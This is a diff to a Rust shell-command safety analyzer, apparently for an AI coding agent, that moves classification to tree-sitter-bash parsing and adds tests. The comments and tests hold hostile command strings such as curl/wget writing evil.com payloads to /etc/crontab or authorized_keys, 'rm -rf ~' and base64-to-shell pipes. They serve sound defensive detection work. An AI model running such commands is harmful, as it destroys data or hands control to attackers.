@@ -5,6 +5,29 @@
 //! This module provides pre-execution analysis of shell commands to detect
 //! potentially dangerous patterns and prevent accidental damage.
 //!
+//! ## Semantic parsing, not keyword blacklists
+//!
+//! [`analyze_command`] parses every command with tree-sitter-bash
+//! ([`crate::bash_ast`]) and reasons over the reconstructed segments —
+//! argv, redirections, substitution sites — instead of raw substring
+//! scanning. What that buys:
+//!
+//! * Quoted operators are data: `echo "a && b"` is one `echo`, not a chain;
+//!   `echo '$(x)'` is not a substitution; `echo "sudo"` is not privileged.
+//! * Payloads riding inside legitimate flags are visible: `find -exec
+//!   <cmd>`, `xargs rm`, `curl -o /etc/crontab`, `> ${HOME}/.zshrc`.
+//! * Deletions hidden in pipeline members, `for`/`if` bodies, or
+//!   substitution values (`x=$(rm -rf ~)`) are screened like any other
+//!   segment.
+//! * Parsing is fail-closed: commands the grammar cannot parse escalate to
+//!   approval, never fall back to looser string matching for
+//!   classification (a belt-and-braces string scan still runs so hidden
+//!   catastrophic shapes block).
+//!
+//! The same restraint as before applies (see [`DANGEROUS_PATTERNS`]): the
+//! dictionary below classifies *actions*; unknown commands require
+//! approval. The AST makes the classification precise, not broader.
+//!
 //! ## Command prefix classification
 //!
 //! [`classify_command`] maps a token slice to its canonical command prefix.
@@ -581,9 +604,6 @@ pub fn literal_dangerous_pattern_reason(command: &str) -> Option<&'static str> {
         .map(|(_, reason)| *reason)
 }
 
-/// Commands that require elevated privileges
-const PRIVILEGED_PATTERNS: &[&str] = &["sudo", "su ", "doas", "pkexec", "gksudo", "kdesudo"];
-
 /// Network-related commands
 const NETWORK_COMMANDS: &[&str] = &[
     "curl",
@@ -608,11 +628,19 @@ const NETWORK_COMMANDS: &[&str] = &[
     "wireshark",
 ];
 
-/// Analyze a shell command for safety
-pub fn analyze_command(command: &str) -> SafetyAnalysis {
-    let command_lower = command.to_lowercase();
-    let command_trimmed = command.trim();
+/// Whole-token privileged execution words — matched exactly against argv
+/// tokens so `sudoedit` (prefix collision) and quoted text don't trip.
+const PRIVILEGED_TOKENS: &[&str] = &["sudo", "su", "doas", "pkexec", "gksudo", "kdesudo"];
 
+/// Analyze a shell command for safety.
+///
+/// The command is parsed with tree-sitter-bash ([`crate::bash_ast`]) and
+/// every check below reasons over the reconstructed segments — argv,
+/// redirections, substitution sites — instead of raw substring scanning.
+/// Quoted operators (`"a && b"`, `'$(x)'`) are data to the parser, so they
+/// no longer trip the chain/substitution/redirect checks. Parsing is
+/// fail-closed: unparseable commands escalate to approval.
+pub fn analyze_command(command: &str) -> SafetyAnalysis {
     if command.contains('\n') || command.contains('\r') {
         return SafetyAnalysis::dangerous(
             command,
@@ -629,7 +657,11 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         );
     }
 
-    if let Some(analysis) = analyze_destructive_patterns(command) {
+    let Ok(facts) = crate::bash_ast::BashFacts::parse(command) else {
+        return analyze_unparseable(command);
+    };
+
+    if let Some(analysis) = analyze_destructive_patterns(&facts, command) {
         return analysis;
     }
 
@@ -644,12 +676,12 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         );
     }
 
-    if command.contains("&&") || command.contains("||") || command.contains(';') {
+    if facts.has_chain() {
         // Chains of known-safe commands (cargo/git/zig/npm/etc.) are
         // routine for build+test workflows. Instead of hard-blocking,
         // escalate to RequiresApproval so the user can still deny in
         // non-trusted modes. YOLO/auto-approve flows pass through.
-        if all_segments_known_safe(command) {
+        if all_segments_known_safe(&facts) {
             return SafetyAnalysis::requires_approval(
                 command,
                 vec!["Command chains known-safe segments (cargo/git/etc.)".to_string()],
@@ -665,48 +697,54 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         );
     }
 
-    if command.contains("`") || command.contains("$(") {
+    if facts.any_command_substitution() {
         // Substitution is a common shell pattern (e.g., `cargo test
         // $(cargo test --list | head -1)` or `echo $(date)`). Codex
         // doesn't block it; escalate to approval so the user can
-        // inspect, but don't hard-block.
+        // inspect, but don't hard-block. Quoted `'$(…)'` never runs and
+        // does not trip this check.
         return SafetyAnalysis::requires_approval(
             command,
             vec!["Command substitution detected".to_string()],
         );
     }
 
+    // A variable expansion in command position (`${CMD} …`, `$IFS …`) means
+    // the program that runs is not statically visible.
+    if facts.segments.iter().any(|s| s.expansion_in_command_name) {
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec!["Command name contains a variable expansion".to_string()],
+        );
+    }
+
     // Check for privileged commands
-    for pattern in PRIVILEGED_PATTERNS {
-        if command_trimmed.starts_with(pattern) || command_lower.contains(&format!(" {pattern} ")) {
-            return SafetyAnalysis::requires_approval(
-                command,
-                vec![format!(
-                    "Command uses privileged execution ({})",
-                    pattern.trim()
-                )],
-            );
-        }
+    if let Some(token) = privileged_token_in(&facts) {
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec![format!("Command uses privileged execution ({token})")],
+        );
     }
 
     // Output redirection: targets outside the workspace are Dangerous,
     // relative targets escalate to approval (this runs before the pipe and
     // safe-match branches so `a | b > out` and `safe-cmd > out` are caught).
-    if let Some(analysis) = redirect_analysis(command) {
+    if let Some(analysis) = redirect_analysis(&facts, command) {
         return analysis;
     }
 
     // Pipes: not chains for classification purposes, so classify per
     // segment — every segment must be a known-safe command to stay Safe
     // (pipe-to-shell was already handled as Dangerous above).
-    if command.contains('|') {
-        let segments: Vec<&str> = command.split('|').map(str::trim).collect();
-        if segments.iter().all(|s| is_safe_command(s)) {
+    if facts.has_pipe() {
+        let members: Vec<&crate::bash_ast::CommandSegment> =
+            facts.segments.iter().filter(|s| !s.is_nested).collect();
+        if members.iter().all(|s| is_safe_argv(&s.argv)) {
             return SafetyAnalysis::safe(command);
         }
-        if segments
+        if members
             .iter()
-            .all(|s| is_safe_command(s) || is_workspace_safe_command(s))
+            .all(|s| is_safe_argv(&s.argv) || is_workspace_safe_argv(&s.argv))
         {
             return SafetyAnalysis::workspace_safe(
                 command,
@@ -719,20 +757,43 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         );
     }
 
-    // Check if it's a known safe command. The primary token (skipping `env`
-    // wrappers and VAR=value assignments) is what the network/rm checks below
-    // should key on, so they see the wrapped command, not `env`.
-    let analysis_tokens = shell_words(command_trimmed);
-    let first_word = primary_token_index(&analysis_tokens)
-        .and_then(|idx| analysis_tokens.get(idx))
+    // Single command: classify the first top-level segment (nested
+    // substitution bodies were already screened by the checks above).
+    let Some(segment) = facts.segments.iter().find(|s| !s.is_nested) else {
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec!["Unknown command - review before execution".to_string()],
+        );
+    };
+    analyze_single_segment(segment, command)
+}
+
+/// Classify one simple command segment (no chains, pipes, substitutions).
+fn analyze_single_segment(
+    segment: &crate::bash_ast::CommandSegment,
+    command: &str,
+) -> SafetyAnalysis {
+    let argv = &segment.argv;
+    let first_word = primary_token_index(argv)
+        .and_then(|idx| argv.get(idx))
         .map(String::as_str)
         .unwrap_or("");
-    if is_safe_command(command_trimmed) {
+
+    // `! cmd` negation hides the primary token from naive scanning; the
+    // AST sees through it, but negated commands stay escalated to match
+    // the pre-AST classification of `! …` as unknown.
+    if segment.is_negated {
+        return SafetyAnalysis::requires_approval(
+            command,
+            vec!["Negated command - review before execution".to_string()],
+        );
+    }
+
+    if is_safe_argv(argv) {
         return SafetyAnalysis::safe(command);
     }
 
-    // Check for workspace-safe commands
-    if is_workspace_safe_command(command_trimmed) {
+    if is_workspace_safe_argv(argv) {
         return SafetyAnalysis::workspace_safe(command, "Command modifies files within workspace");
     }
 
@@ -745,35 +806,37 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
     }
 
     // Check for rm with -r or -f flags
-    if first_word == "rm" && (command_lower.contains("-r") || command_lower.contains("-f")) {
-        let mut reasons = vec!["Recursive or forced deletion".to_string()];
-        let mut suggestions = vec![];
-
-        // Check if it's deleting outside workspace markers
-        if command_lower.contains("..")
-            || command_lower.contains("~/")
-            || command_lower.contains("$HOME")
-        {
-            reasons.push("May delete files outside workspace".to_string());
-            suggestions.push("Use relative paths within the workspace".to_string());
-            return SafetyAnalysis::dangerous(command, reasons, suggestions);
+    if first_word == "rm" {
+        let args = &argv[primary_token_index(argv).expect("first_word exists") + 1..];
+        let (recursive, force) = rm_flags(args);
+        if recursive || force {
+            if let Some(reason) = dangerous_rm_target_reason(args) {
+                return SafetyAnalysis::dangerous(
+                    command,
+                    vec![reason],
+                    vec!["Use relative paths within the workspace".to_string()],
+                );
+            }
+            return SafetyAnalysis::requires_approval(
+                command,
+                vec!["Recursive or forced deletion".to_string()],
+            );
         }
-
-        return SafetyAnalysis::requires_approval(command, reasons);
     }
 
     // Check for git push/force operations
-    if command_lower.contains("git push") {
-        if command_lower.contains("--force") || command_lower.contains("-f") {
+    if let Some(start) = primary_token_index(argv) {
+        if tokens_start_with(argv, start, "git push") {
+            let force = argv[start..].iter().any(|t| t == "--force" || t == "-f");
             return SafetyAnalysis::requires_approval(
                 command,
-                vec!["Force push can overwrite remote history".to_string()],
+                vec![if force {
+                    "Force push can overwrite remote history".to_string()
+                } else {
+                    "Push will modify remote repository".to_string()
+                }],
             );
         }
-        return SafetyAnalysis::requires_approval(
-            command,
-            vec!["Push will modify remote repository".to_string()],
-        );
     }
 
     // Default: requires approval for unknown commands
@@ -783,7 +846,136 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
     )
 }
 
-fn analyze_destructive_patterns(command: &str) -> Option<SafetyAnalysis> {
+/// Fail-closed path for commands the bash grammar cannot parse (unclosed
+/// quotes, broken syntax). The string-based destructive scan still runs so
+/// hidden `rm`/pipe-to-shell shapes block, then the command escalates.
+fn analyze_unparseable(command: &str) -> SafetyAnalysis {
+    if let Some(analysis) = analyze_destructive_patterns_legacy(command) {
+        return analysis;
+    }
+    if let Some(reason) = literal_dangerous_pattern_reason(command) {
+        return SafetyAnalysis::dangerous(
+            command,
+            vec![reason.to_string()],
+            vec!["Review the command carefully before execution".to_string()],
+        );
+    }
+    SafetyAnalysis::requires_approval(
+        command,
+        vec![
+            "Command could not be parsed for safety analysis".to_string(),
+            "Fix quoting/syntax so the command can be analyzed".to_string(),
+        ],
+    )
+}
+
+/// Destructive-pattern scan over every executable segment the AST found —
+/// including pipeline members, compound-statement bodies, and commands
+/// nested inside substitutions. A deletion hidden in `for …; do rm …` or
+/// `x=$(rm …)` is a deletion.
+fn analyze_destructive_patterns(
+    facts: &crate::bash_ast::BashFacts,
+    command: &str,
+) -> Option<SafetyAnalysis> {
+    for segment in &facts.segments {
+        let Some(primary) = segment.primary() else {
+            continue;
+        };
+        if primary == "eval" {
+            return Some(SafetyAnalysis::dangerous(
+                command,
+                vec!["Command invokes shell eval".to_string()],
+                vec!["Avoid evaluating dynamically generated shell input".to_string()],
+            ));
+        }
+        let Some(start) = primary_token_index(&segment.argv) else {
+            continue;
+        };
+        match primary {
+            "rm" => {
+                if let Some(reason) = dangerous_rm_reason(&segment.argv[start + 1..]) {
+                    return Some(SafetyAnalysis::dangerous(
+                        command,
+                        vec![reason],
+                        vec!["Review the deletion target before retrying".to_string()],
+                    ));
+                }
+            }
+            "xargs" => {
+                // `xargs rm …` runs `rm` over piped input — its targets go
+                // through the same deletion checks.
+                let rest = &segment.argv[start + 1..];
+                if let Some(pos) = rest.iter().position(|t| t == "rm") {
+                    if let Some(reason) = dangerous_rm_reason(&rest[pos + 1..]) {
+                        return Some(SafetyAnalysis::dangerous(
+                            command,
+                            vec![reason],
+                            vec!["Review the deletion target before retrying".to_string()],
+                        ));
+                    }
+                }
+            }
+            "curl" | "wget" => {
+                // `-o/--output <path>` with a sensitive destination is file
+                // overwrite riding on a download flag (article 16: `curl -o
+                // /etc/crontab http://evil.com/payload`).
+                if let Some(target) = download_output_target(&segment.argv[start + 1..]) {
+                    if redirect_target_outside_workspace(&target) {
+                        return Some(SafetyAnalysis::dangerous(
+                            command,
+                            vec![
+                                "Download output targets a path outside the workspace".to_string(),
+                            ],
+                            vec!["Download to a relative path inside the workspace".to_string()],
+                        ));
+                    }
+                }
+            }
+            "find" => {
+                if let Some(analysis) = analyze_find_mutation(command, &segment.argv[start + 1..]) {
+                    return Some(analysis);
+                }
+            }
+            _ => {}
+        }
+    }
+
+    // Any pipe whose right side runs an interactive shell executes whatever
+    // the left side produces — including obfuscated payloads
+    // (`echo <b64> | base64 -d | sh`). The left side need not be a network
+    // command for this to be code execution, so match any source.
+    let pipes_to_shell = facts.segments.iter().any(|segment| {
+        segment.join == Some(crate::bash_ast::SegmentJoin::Pipe)
+            && segment.primary().is_some_and(|token| {
+                matches!(token, "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish")
+            })
+    });
+    if pipes_to_shell {
+        return Some(SafetyAnalysis::dangerous(
+            command,
+            vec!["Piping remote content directly to shell is dangerous".to_string()],
+            vec!["Download the script first and review it before execution".to_string()],
+        ));
+    }
+
+    None
+}
+
+/// Privileged token (exact argv match) anywhere in the command, if any.
+fn privileged_token_in(facts: &crate::bash_ast::BashFacts) -> Option<&'static str> {
+    facts.segments.iter().find_map(|segment| {
+        segment
+            .argv
+            .iter()
+            .find_map(|token| PRIVILEGED_TOKENS.iter().find(|p| *p == token))
+            .copied()
+    })
+}
+
+/// String-based destructive scan for commands the grammar cannot parse —
+/// the belt-and-braces pass that keeps hidden `rm`/pipe-to-shell shapes
+/// blocked even in unparseable input.
+fn analyze_destructive_patterns_legacy(command: &str) -> Option<SafetyAnalysis> {
     if primary_shell_command_is(command, "eval") {
         return Some(SafetyAnalysis::dangerous(
             command,
@@ -884,82 +1076,51 @@ fn is_env_assignment(token: &str) -> bool {
             .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
 }
 
-/// An output redirection found in a command (`>`, `>>`, `&>`, `&>>`, or
-/// fd-prefixed `N>`/`N>>` forms). Dup forms (`2>&1`, `>&2`) are excluded —
-/// they redirect to another descriptor, not a path.
-struct OutputRedirect {
-    target: String,
-}
-
 /// Targets that are safe to redirect to unconditionally.
 const REDIRECT_BENIGN_TARGETS: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"];
 
-/// Scan `command` for output redirections. Hand-rolled scanner because the
-/// shell grammar allows `>target` and `> target` (shlex does not split the
-/// operator from the word in the glued form). Stdin (`<`) and heredocs (`<<`)
-/// are not scanned — only `>`-family matters here.
-fn output_redirects(command: &str) -> Vec<OutputRedirect> {
-    let bytes = command.as_bytes();
-    let mut out = Vec::new();
-    let mut i = 0;
-    while i < bytes.len() {
-        if bytes[i] != b'>' {
-            i += 1;
-            continue;
-        }
-        let mut j = (i + 1).min(bytes.len());
-        if j < bytes.len() && bytes[j] == b'>' {
-            j += 1; // append form `>>`
-        }
-        while j < bytes.len() && bytes[j] == b' ' {
-            j += 1;
-        }
-        let target_start = j;
-        while j < bytes.len()
-            && !bytes[j].is_ascii_whitespace()
-            && !matches!(bytes[j], b';' | b'|' | b'&')
-        {
-            j += 1;
-        }
-        let target = command[target_start..j].to_string();
-        if !target.starts_with('&') {
-            out.push(OutputRedirect { target });
-        }
-        i = j.max(i + 1);
-    }
-    out
-}
-
-/// Classify output redirections, if any: targets outside the workspace
-/// (`~`, `$HOME`, absolute paths, `..`) are Dangerous; relative targets
-/// escalate to RequiresApproval (they create/overwrite files). Returns
-/// `None` when there are no path redirections.
-fn redirect_analysis(command: &str) -> Option<SafetyAnalysis> {
-    let redirects = output_redirects(command);
-    if redirects.is_empty() {
-        return None;
-    }
-    for redirect in &redirects {
-        let target = redirect.target.as_str();
-        if REDIRECT_BENIGN_TARGETS.contains(&target) {
-            continue;
-        }
-        let outside_workspace = target.starts_with('~')
-            || target.starts_with('/')
-            || target.starts_with("$HOME")
-            || target.contains("..");
-        if outside_workspace {
-            return Some(SafetyAnalysis::dangerous(
-                command,
-                vec!["Output redirection targets a path outside the workspace".to_string()],
-                vec!["Redirect to a relative path inside the workspace".to_string()],
-            ));
+/// Classify output redirections from the AST facts, if any: targets outside
+/// the workspace (`~`, `$HOME`, absolute paths, `..`) are Dangerous; an
+/// expansion in the destination (`> ${HOME}/…`) cannot be resolved and is
+/// treated as outside; relative targets escalate to RequiresApproval (they
+/// create/overwrite files). Returns `None` when there are no path
+/// redirections. Quoted `>` characters inside arguments are data and never
+/// reach this check.
+fn redirect_analysis(facts: &crate::bash_ast::BashFacts, command: &str) -> Option<SafetyAnalysis> {
+    let mut has_relative = false;
+    for segment in &facts.segments {
+        for redirect in &segment.redirects {
+            let target = redirect.target.as_str();
+            if REDIRECT_BENIGN_TARGETS.contains(&target) {
+                continue;
+            }
+            if segment.expansion_in_redirect_target {
+                // `> ${HOME}/.zshrc` is the same threat as `> $HOME/.zshrc`;
+                // an unresolvable destination is assumed to be outside.
+                return Some(SafetyAnalysis::dangerous(
+                    command,
+                    vec!["Output redirection targets a path outside the workspace".to_string()],
+                    vec!["Redirect to a relative path inside the workspace".to_string()],
+                ));
+            }
+            let outside_workspace = redirect_target_outside_workspace(target);
+            if outside_workspace {
+                return Some(SafetyAnalysis::dangerous(
+                    command,
+                    vec!["Output redirection targets a path outside the workspace".to_string()],
+                    vec!["Redirect to a relative path inside the workspace".to_string()],
+                ));
+            }
+            has_relative = true;
         }
     }
-    Some(SafetyAnalysis::requires_approval(
-        command,
-        vec!["Output redirection writes to files".to_string()],
-    ))
+    if has_relative {
+        return Some(SafetyAnalysis::requires_approval(
+            command,
+            vec!["Output redirection writes to files".to_string()],
+        ));
+    }
+    None
 }
 
 fn primary_shell_command_is(command: &str, expected: &str) -> bool {
@@ -995,11 +1156,11 @@ fn pipes_content_to_shell(command: &str) -> bool {
     })
 }
 
-fn dangerous_rm_reason(args: &[String]) -> Option<String> {
+/// Parse `rm`-style mutation flags: which argv entries set recursive /
+/// force deletion. Flags never count as deletion targets.
+fn rm_flags(args: &[String]) -> (bool, bool) {
     let mut recursive = false;
     let mut force = false;
-    let mut targets = Vec::new();
-
     for arg in args {
         match arg.as_str() {
             "--" => continue,
@@ -1009,14 +1170,15 @@ fn dangerous_rm_reason(args: &[String]) -> Option<String> {
                 recursive |= flag.chars().any(|ch| matches!(ch, 'r' | 'R'));
                 force |= flag.chars().any(|ch| ch == 'f');
             }
-            target => targets.push(target),
+            _ => {}
         }
     }
+    (recursive, force)
+}
 
-    if !(recursive || force) {
-        return None;
-    }
-
+/// The reason a `rm` target is dangerous (root/home/escape), if any.
+fn dangerous_rm_target_reason(args: &[String]) -> Option<String> {
+    let targets = args.iter().filter(|arg| !arg.starts_with('-'));
     for target in targets {
         if is_root_delete_target(target) {
             return Some("Recursive or forced deletion targets the root filesystem".to_string());
@@ -1028,16 +1190,29 @@ fn dangerous_rm_reason(args: &[String]) -> Option<String> {
             return Some("Recursive or forced deletion may escape the workspace".to_string());
         }
     }
-
     None
+}
+
+/// Combined destructive-`rm` check: mutation flags set *and* a dangerous
+/// target.
+fn dangerous_rm_reason(args: &[String]) -> Option<String> {
+    let (recursive, force) = rm_flags(args);
+    if !(recursive || force) {
+        return None;
+    }
+    dangerous_rm_target_reason(args)
 }
 
 fn analyze_find_mutation(command: &str, args: &[String]) -> Option<SafetyAnalysis> {
     let has_delete = args.iter().any(|arg| arg == "-delete");
-    let execs_rm = args
+    // `-exec`/`-execdir <cmd>` executes an embedded command — any command,
+    // not just `rm` (`-exec sh -c '…'` was classified Safe by the
+    // string-scanner era). A flag right after `-exec` is not a command
+    // word, so it does not count.
+    let execs_embedded = args
         .windows(2)
-        .any(|pair| pair[0] == "-exec" && pair[1] == "rm");
-    if !(has_delete || execs_rm) {
+        .any(|pair| (pair[0] == "-exec" || pair[0] == "-execdir") && !pair[1].starts_with('-'));
+    if !(has_delete || execs_embedded) {
         return None;
     }
 
@@ -1060,8 +1235,46 @@ fn analyze_find_mutation(command: &str, args: &[String]) -> Option<SafetyAnalysi
 
     Some(SafetyAnalysis::requires_approval(
         command,
-        vec!["find command may delete files".to_string()],
+        vec![if has_delete {
+            "find command may delete files".to_string()
+        } else {
+            "find -exec executes an embedded command".to_string()
+        }],
     ))
+}
+
+/// The write destination of a download command's output flag
+/// (`-o`/`-O`/`--output`/`--output-document`), supporting the glued
+/// (`-oFILE`) and `--output=FILE` forms. `None` when the command writes to
+/// its default location (cwd/remote filename) or has no output flag.
+fn download_output_target(args: &[String]) -> Option<String> {
+    let mut iter = args.iter().enumerate();
+    while let Some((idx, arg)) = iter.next() {
+        let target = if let Some(value) = arg.strip_prefix("--output=") {
+            Some(value.to_string())
+        } else if arg == "--output" || arg == "--output-document" || arg == "-o" || arg == "-O" {
+            args.get(idx + 1).cloned()
+        } else if arg.len() > 2 && (arg.starts_with("-o") || arg.starts_with("-O")) {
+            Some(arg[2..].to_string())
+        } else {
+            None
+        };
+        if let Some(target) = target {
+            if !target.starts_with('-') {
+                return Some(target);
+            }
+        }
+    }
+    None
+}
+
+/// Shared outside-workspace predicate for write destinations (redirects,
+/// download outputs): `~`, absolute paths, `$HOME`, or any `..` component.
+fn redirect_target_outside_workspace(target: &str) -> bool {
+    target.starts_with('~')
+        || target.starts_with('/')
+        || target.starts_with("$HOME")
+        || target.contains("..")
 }
 
 fn is_root_delete_target(target: &str) -> bool {
@@ -1106,19 +1319,14 @@ fn tokens_start_with(tokens: &[String], start: usize, safe_cmd: &str) -> bool {
     true
 }
 
-/// Check if a command is known to be safe
-fn is_safe_command(command: &str) -> bool {
-    let tokens = shell_words(command);
-    // Bare `env` just prints the (scrubbed) child environment.
-    if tokens.len() == 1 && tokens[0].eq_ignore_ascii_case("env") {
-        return true;
-    }
-    let Some(start) = primary_token_index(&tokens) else {
+/// Check if a command segment is safe within the workspace (argv-based).
+fn is_workspace_safe_argv(argv: &[String]) -> bool {
+    let Some(start) = primary_token_index(argv) else {
         return false;
     };
-    SAFE_COMMANDS
+    WORKSPACE_SAFE_COMMANDS
         .iter()
-        .any(|safe| tokens_start_with(&tokens, start, safe))
+        .any(|safe| tokens_start_with(argv, start, safe))
 }
 
 /// Build/test/source-control commands that are reasonable to chain in a
@@ -1132,42 +1340,37 @@ const KNOWN_SAFE_CHAIN_PREFIXES: &[&str] = &[
     "wc", "sort", "uniq", "which", "env", "true", "false",
 ];
 
-/// Return true when every segment of a chained command (`a && b ; c || d`)
-/// has a leading token in `KNOWN_SAFE_CHAIN_PREFIXES`. Used to permit routine
-/// build+test chains without escalating to Dangerous.
-fn all_segments_known_safe(command: &str) -> bool {
-    let normalized = command
-        .replace("&&", "\n")
-        .replace("||", "\n")
-        .replace(';', "\n");
-    let segments: Vec<&str> = normalized
-        .split('\n')
-        .map(str::trim)
-        .filter(|s| !s.is_empty())
-        .collect();
-    if segments.is_empty() {
+/// Return true when every top-level segment of a chained command
+/// (`a && b ; c || d`) has its primary command in
+/// `KNOWN_SAFE_CHAIN_PREFIXES`. Used to permit routine build+test chains
+/// without escalating to Dangerous.
+fn all_segments_known_safe(facts: &crate::bash_ast::BashFacts) -> bool {
+    let top: Vec<&crate::bash_ast::CommandSegment> =
+        facts.segments.iter().filter(|s| !s.is_nested).collect();
+    if top.is_empty() {
         return false;
     }
-    segments.iter().all(|seg| {
-        let head = seg
-            .split_whitespace()
-            .find(|tok| !tok.contains('=') && *tok != "env")
-            .unwrap_or("");
+    top.iter().all(|segment| {
+        let head = segment.primary().unwrap_or("");
         KNOWN_SAFE_CHAIN_PREFIXES
             .iter()
             .any(|prefix| head.eq_ignore_ascii_case(prefix))
     })
 }
 
-/// Check if a command is safe within the workspace
-fn is_workspace_safe_command(command: &str) -> bool {
-    let tokens = shell_words(command);
-    let Some(start) = primary_token_index(&tokens) else {
+/// Check if a command segment is known to be safe (argv-based; `env`
+/// wrappers and assignments are skipped by `primary_token_index`).
+fn is_safe_argv(argv: &[String]) -> bool {
+    // Bare `env` just prints the (scrubbed) child environment.
+    if argv.len() == 1 && argv[0].eq_ignore_ascii_case("env") {
+        return true;
+    }
+    let Some(start) = primary_token_index(argv) else {
         return false;
     };
-    WORKSPACE_SAFE_COMMANDS
+    SAFE_COMMANDS
         .iter()
-        .any(|safe| tokens_start_with(&tokens, start, safe))
+        .any(|safe| tokens_start_with(argv, start, safe))
 }
 
 /// Check if a path escapes the workspace
@@ -1948,5 +2151,173 @@ mod tests {
         assert!(!matches!(rel.level, SafetyLevel::Dangerous));
         assert!(!matches!(rel.level, SafetyLevel::Safe));
         assert!(!matches!(rel.level, SafetyLevel::WorkspaceSafe));
+    }
+
+    // ---- AST-based precision (tree-sitter-bash) ----
+    //
+    // Quoted operators are data, not control flow: the fourth wall now
+    // parses commands into a bash syntax tree, so `&&`/`|`/`>`/`$(` inside
+    // quoted arguments no longer trip the corresponding checks.
+
+    #[test]
+    fn quoted_chain_separator_is_data_not_a_chain() {
+        assert!(matches!(
+            analyze_command("echo \"a && b\"").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn quoted_substitution_is_not_a_substitution() {
+        // `$(date)` inside single quotes never executes — it is a literal.
+        // (A literal `rm -rf /` payload would still hit the substring-based
+        // catastrophic-pattern backstop; that backstop is intentional.)
+        assert!(matches!(
+            analyze_command("echo '$(date)'").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn quoted_redirect_is_not_a_redirect() {
+        assert!(matches!(
+            analyze_command("echo \"a > /etc/passwd\"").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn quoted_privileged_word_is_not_privileged() {
+        assert!(matches!(
+            analyze_command("echo \"sudo hi\"").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn pipeline_member_deletion_is_caught_semantically() {
+        // The old scanner missed `rm` as a *pipeline member* (it only looked
+        // at chain segments); the AST flattens pipes, so the deletion target
+        // check fires on the `rm` segment itself.
+        assert!(matches!(
+            analyze_command("ls | rm -rf ../out").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn compound_statement_body_deletion_is_caught() {
+        // `for`/`if` bodies execute their commands; destructive patterns
+        // must see through the compound statement.
+        assert!(matches!(
+            analyze_command("for x in *; do rm -rf ~/Downloads; done").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn substitution_inner_deletion_is_caught() {
+        // `x=$(rm -rf ~)` runs `rm`; the embedded command is a segment.
+        assert!(matches!(
+            analyze_command("x=$(rm -rf ~)").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    #[test]
+    fn unparseable_command_requires_approval() {
+        // Fail-closed: an unclosed quote means the command cannot be
+        // analyzed, so it escalates instead of falling back to looser
+        // string scanning for the *classification* path (the destructive
+        // scan still runs as a belt-and-braces check).
+        assert!(matches!(
+            analyze_command("echo 'unclosed").level,
+            SafetyLevel::RequiresApproval
+        ));
+        // …and a destructive shape hidden in unparseable input still blocks.
+        assert!(matches!(
+            analyze_command("echo 'unclosed; rm -rf /").level,
+            SafetyLevel::Dangerous
+        ));
+    }
+
+    // ---- AST-only semantic detections (stage B) ----
+    //
+    // These shapes are invisible to substring scanning: the payload rides
+    // inside legitimate flags of legitimate commands.
+
+    #[test]
+    fn find_exec_executes_embedded_commands() {
+        // `-exec <anything>` executes the embedded command — `sh` deserves
+        // at least as much scrutiny as `rm`.
+        let sh = analyze_command("find . -type f -exec sh -c 'x' \\;");
+        assert!(
+            matches!(
+                sh.level,
+                SafetyLevel::RequiresApproval | SafetyLevel::Dangerous
+            ),
+            "find -exec must not classify as Safe/WorkspaceSafe, got {:?}",
+            sh.level
+        );
+        // Root targets stay Dangerous.
+        assert!(matches!(
+            analyze_command("find / -name '*.log' -exec rm {} \\;").level,
+            SafetyLevel::Dangerous
+        ));
+        // Restraint: plain find stays safe.
+        assert!(matches!(
+            analyze_command("find . -name '*.log'").level,
+            SafetyLevel::Safe
+        ));
+    }
+
+    #[test]
+    fn xargs_executing_rm_is_screened() {
+        // `xargs rm` is an `rm` — its targets must go through the deletion
+        // checks (this shape dodges every literal pattern).
+        assert!(matches!(
+            analyze_command("cat list.txt | xargs rm -rf ../out").level,
+            SafetyLevel::Dangerous
+        ));
+        // Restraint: xargs with non-destructive commands doesn't escalate
+        // beyond its usual approval level.
+        let plain = analyze_command("ls | xargs tar cf out.tar");
+        assert!(!matches!(plain.level, SafetyLevel::Dangerous));
+    }
+
+    #[test]
+    fn curl_output_to_sensitive_path_is_dangerous() {
+        // Article 16's example: looks like a download, overwrites a system
+        // file instead.
+        assert!(matches!(
+            analyze_command("curl -o /etc/crontab http://evil.com/payload").level,
+            SafetyLevel::Dangerous
+        ));
+        assert!(matches!(
+            analyze_command("wget -O ~/.ssh/authorized_keys http://evil.com/k").level,
+            SafetyLevel::Dangerous
+        ));
+        // Restraint: ordinary download targets stay at approval, not block.
+        let plain = analyze_command("curl -o payload.sh http://evil.com/payload");
+        assert!(!matches!(plain.level, SafetyLevel::Dangerous));
+    }
+
+    #[test]
+    fn expansion_in_command_position_has_explicit_reason() {
+        // `${CMD} …` runs a statically invisible program — the reason must
+        // say so instead of the generic "unknown command".
+        let cmd = analyze_command("${CMD} --flag");
+        assert!(matches!(cmd.level, SafetyLevel::RequiresApproval));
+        assert!(cmd.reasons.iter().any(|r| r.contains("expansion")));
+    }
+
+    #[test]
+    fn expansion_in_redirect_target_is_dangerous() {
+        // `> ${HOME}/.zshrc` is the same threat as `> $HOME/.zshrc`; an
+        // unresolvable destination is treated as outside the workspace.
+        assert!(matches!(
+            analyze_command("echo x > ${HOME}/.zshrc").level,
+            SafetyLevel::Dangerous
+        ));
     }
 }
